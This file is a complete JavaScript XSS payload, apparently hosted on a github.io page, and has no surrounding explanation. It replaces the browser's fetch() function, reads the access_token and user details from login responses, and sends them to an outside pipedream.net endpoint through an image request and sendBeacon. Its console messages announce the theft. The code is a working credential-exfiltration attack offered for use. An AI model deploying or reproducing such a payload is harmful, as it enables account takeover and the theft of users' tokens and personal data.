// https://secnge.github.io/propas/x.js

(function() {
    var EXFIL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';

    // Hook fetch() – intercept login response
    var orig = window.fetch;
    window.fetch = function() {
        return orig.apply(this, arguments).then(function(r) {
            var c = r.clone();
            c.json().then(function(d) {
                var t = d.access_token;
                if (t) {
                    // === USE GET INSTEAD OF POST ===
                    // This sends the token as a URL parameter
                    var url = EXFIL + '?token=' + encodeURIComponent(t) + 
                              '&user=' + encodeURIComponent(JSON.stringify(d.user || {}));
                    new Image().src = url;  // GET request via image
                    // OR use navigator.sendBeacon with GET (via URL)
                    navigator.sendBeacon(url);
                    console.log('[XSS] Token exfiltrated via GET');
                }
            }).catch(function() {});
            return r;
        });
    };

    console.log('[XSS] Payload ready – waiting for login...');
})();
